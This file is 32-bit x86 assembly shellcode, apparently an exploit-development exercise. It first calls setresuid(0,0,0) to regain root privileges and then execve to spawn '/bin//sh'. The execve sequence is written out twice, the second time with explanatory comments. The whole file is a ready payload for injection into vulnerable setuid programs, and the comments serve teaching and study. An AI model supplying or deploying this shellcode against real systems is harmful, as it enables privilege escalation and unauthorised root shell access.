BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);

xor eax, eax    ; Zero out eax.
xor ebx, ebx    ; Zero out ebx.
xor ecx, ecx    ; Zero out ecx.
xor edx, edx    ; Zero out edx.
mov al, 0xa4    ; 164 (0xa4) for syscall #164
int 0x80        ; setresuid(0, 0, 0) Restore all root privs.

; execve(const char
xor eax, eax
mov al, 11
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80

; execve(*filename, char *const argv [], char *const envp[])

	xor eax, eax 			; Make sure eax is zeroed again.
	mov al, 11				; syscall #11
	push ecx					; push some nulls for string termination.
	push 0x68732f2f		; push "//sh" to the stack.
	push 0x6e69622f		; push "/bin" to the stack.
	mov ebx, esp			; Put the address of "/bin//sh" into ebx via esp.
	push ecx					; push 32-bit null terminator to stack.
	mov edx, esp			; This is an empty array for envp.
	push ebx					; push string addr to stack above null terminator.
	mov ecx, esp			; This is the argv array with string ptr.
	int 0x80						; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
